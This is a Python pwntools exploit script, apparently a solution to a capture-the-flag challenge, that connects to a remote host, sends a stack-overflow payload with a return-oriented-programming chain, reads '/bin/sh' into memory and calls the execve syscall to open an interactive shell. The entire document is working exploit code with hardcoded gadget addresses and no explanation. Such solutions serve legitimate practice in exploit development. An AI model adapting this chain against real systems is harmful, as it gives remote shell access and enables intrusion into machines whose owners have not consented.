from pwn import*

context.update(arch='amd64',os='linux',log_level='debug')

context.terminal = ["qterminal", "-e"]
#p=process('./vuln')
p=remote('xyctf.top',34998)
#gdb.attach(p,'b*0x40184C')
syscall=p64(0x0401cd4)
rdx_ret=p64(0x0451322)
rsi_ret=p64(0x0409f8e)
rdi_ret=p64(0x401f1f)
rbp_ret=p64(0x401771)
rax_ret=p64(0x447fe7)
ret=p64(0x40184D)
payload1=b'a'*0x28+rdi_ret+p64(0)+rsi_ret+p64(0x4C72A0)+rdx_ret+p64(0x100)+p64(0x0447580)+rax_ret+p64(59)+rdi_ret+p64(0x4C72A0)+rsi_ret+p64(0)+rdx_ret+p64(0)+syscall
p.send(payload1)
sleep(0.2)
p.sendline(b'/bin/sh\x00')
#reread
p.interactive()